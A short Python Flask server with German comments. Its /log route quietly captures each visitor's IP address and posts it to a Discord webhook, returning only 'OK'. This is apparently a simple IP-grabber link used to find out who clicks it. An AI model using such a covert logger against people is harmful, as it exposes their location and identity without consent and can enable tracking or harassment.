from flask import Flask, request, redirect
from werkzeug.middleware.proxy_fix import ProxyFix
import requests
import os
import time

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

# Webhook aus den Render Environment Variables lesen
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")

@app.route("/")
def home():
    return "Server läuft."
    
@app.route("/log")
def log_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    print("Route aufgerufen")
    print("IP:", ip)

    response = requests.post(
        WEBHOOK_URL,
        json={"content": f"IP: {ip}"},
        timeout=5
    )

    print("Discord Status:", response.status_code)
    print("Discord Antwort:", response.text)

    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
